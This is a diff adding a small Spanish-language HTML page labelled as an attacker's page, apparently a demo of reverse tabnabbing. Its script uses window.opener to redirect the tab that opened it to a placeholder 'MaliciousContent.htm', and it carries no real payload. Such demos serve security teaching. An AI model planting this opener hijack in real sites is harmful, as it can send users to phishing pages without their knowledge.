@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Página del atacante
+        </title>
+        <meta charset="utf-8">
+        <style>
+                html { font: 1em/1.6 sans-serif; }
+                body { padding: 0 .75em; max-width: 70em; margin: 0 auto; }
+            </style>
+    </head>
+    <body>
+        <p>Mira, he cambiado el contenido de la página principal...</p>
+        <script>
+            if (window.opener) {
+                opener.location = 'MaliciousContent.htm';
+            } else {
+                document.querySelector('p').innerHTML = "Me has pillado";
+            }
+        </script>
+    </body>
+</html>
